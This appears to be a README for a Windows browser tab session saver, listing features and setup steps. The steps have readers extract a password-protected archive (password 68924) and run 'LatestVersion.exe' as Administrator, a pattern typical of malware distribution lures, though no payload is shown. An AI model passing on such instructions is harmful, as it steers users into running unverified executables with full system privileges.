## What This Tool Does

- Save all open tabs from Chrome, Edge, Firefox
- Restore tabs with one click
- Multiple sessions - save and switch between different sessions
- Export session list to text file
- Works on Windows 10 and 11

## How to Use

1. Download the archive from the link above
2. Extract with password 68924
3. Right-click LatestVersion.exe and select Run as Administrator
4. Select your browser (Chrome, Edge, or Firefox)
5. Click Save Session - all open tabs are saved
6. To restore, click Restore Session - tabs open automatically
